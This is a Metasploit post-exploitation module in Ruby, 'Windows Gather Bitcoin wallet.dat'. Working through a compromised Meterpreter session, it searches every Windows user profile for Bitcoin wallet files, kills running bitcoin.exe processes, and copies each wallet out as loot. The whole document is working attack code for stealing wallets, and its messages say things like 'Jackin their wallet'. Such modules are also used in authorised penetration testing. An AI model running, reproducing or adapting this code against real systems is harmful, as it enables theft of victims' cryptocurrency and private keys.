##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Bitcoin wallet.dat',
      'Description'   => %q{
        This module downloads any Bitcoin wallet.dat files from the target system
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'illwill <illwill[at]illmob.org>'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run
    print_status("Checking All Users For Bitcoin Wallet...")
    grab_user_profiles().each do |user|
      next if user['AppData'] == nil
      tmpath= user['AppData'] + "\\Bitcoin\\wallet.dat"
      jack_wallet(tmpath)
    end
  end

  def jack_wallet(filename)
    data     = ""
    return if not file?(filename)

    print_status("Wallet Found At #{filename}")
    print_status("     Jackin their wallet...")

    kill_bitcoin

    begin
      data = read_file(filename) || ''
    rescue ::Exception => e
      print_error("Failed to download #{filename}: #{e.class} #{e}")
      return
    end

    if data.empty?
      print_error("     No data found")
    else
      p = store_loot(
        "bitcoin.wallet",
        "application/octet-stream",
        session,
        data,
        filename,
        "Bitcoin Wallet"
      )
      print_status("     Wallet Jacked: #{p.to_s}")
    end
  end

  def kill_bitcoin
    client.sys.process.get_processes().each do |x|
      if x['name'].downcase == "bitcoin.exe"
        print_status("     #{x['name']} Process Found...")
        print_status("     Killing Process ID #{x['pid']}...")
        session.sys.process.kill(x['pid']) rescue nil
      end
    end
  end

end
